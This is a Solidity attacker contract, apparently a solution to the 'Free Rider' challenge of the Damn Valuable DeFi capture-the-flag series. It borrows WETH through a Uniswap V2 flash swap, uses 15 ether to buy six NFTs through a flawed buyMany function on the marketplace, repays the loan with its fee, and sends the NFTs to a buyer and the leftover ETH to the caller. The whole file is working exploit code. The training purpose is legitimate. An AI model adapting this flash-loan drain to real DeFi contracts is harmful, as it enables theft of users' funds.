 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 
import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableNFT.sol";
import "../WETH9.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
// import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

/**
 * @title FreeRiderAttacker
 * @author Elena (Ellena.xyz@proton.me)
 */

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    using SafeMath for uint;
    using Address for address payable;

    WETH9 weth;

    FreeRiderNFTMarketplace marketpalce;

    address buyer;

    IUniswapV2Pair  uniswapPair;

    DamnValuableNFT nft;

    constructor(address payable _weth,address _nft, address _pair, address payable _marketplace, address _buyer ) {
        weth = WETH9(_weth);

        nft = DamnValuableNFT(_nft);

        uniswapPair = IUniswapV2Pair(_pair) ;

        marketpalce = FreeRiderNFTMarketplace(_marketplace);

        buyer = _buyer;
    }

    function attack(uint amount) external{
        
        address token0 = uniswapPair.token0();
        address token1 = uniswapPair.token1();

        // Ensure we are borrowing the correct token (WETH)
        uint256 amount0Out = address(weth)  == token0 ? amount : 0;
        uint256 amount1Out = address(weth)  == token1 ? amount : 0;

        //if data.length is greater than 0, the contract
        // transfers the tokens and then calls the "uniswapV2Call" function on the to address

        uniswapPair.swap(amount0Out, amount1Out, address(this), "I want a flashswap");
    
        // finally we send all the eth we have got to the attackerEOA
         payable(msg.sender).sendValue(address(this).balance);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override{
    
        uint256 amount = address(weth)  ==  uniswapPair.token0() ? amount0 : amount1;

        require(msg.sender == address(uniswapPair), "msg.sender is not a V2 pair"); // ensure that msg.sender is a V2 pair
        
        require(weth.balanceOf(address(this)) > 0, "balanceOf weth is not enough  ");
        //unwrap weth to eth 
        weth.withdraw(amount);

        //buy nft and take advantage of the marketplace vulnerability 
        uint256 [] memory tokenIds = new uint256[](6);
        for(uint i= 0 ; i < 6 ; i++){
            tokenIds[i] = i;
        }
    
        require(address(this).balance >= 15 ether, " not enough ether in attacker contract");

        marketpalce.buyMany{ value : 15 ether}(tokenIds);

        //calculete fees to the flash swap  :  30.09 bps for a direct repayment.
        uint repayment = (amount * 100301) / 100000; 

        require(address(this).balance >= repayment , "balance is less than repayment amount ");

        //rewrap eth to weth
        weth.deposit{ value : repayment}();

        //payback the original and fees for the flash swap
        require(weth.transfer(msg.sender, repayment), "repay to flashswap failed ");

        //send the nfts to the buyer 
        for (uint256 i = 0; i < 6; i++) {
             nft.safeTransferFrom(address(this), buyer, tokenIds[i]);
        }
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory ) external override returns (bytes4) { 
         return IERC721Receiver.onERC721Received.selector;
    } 
       
    receive() external payable{}

}

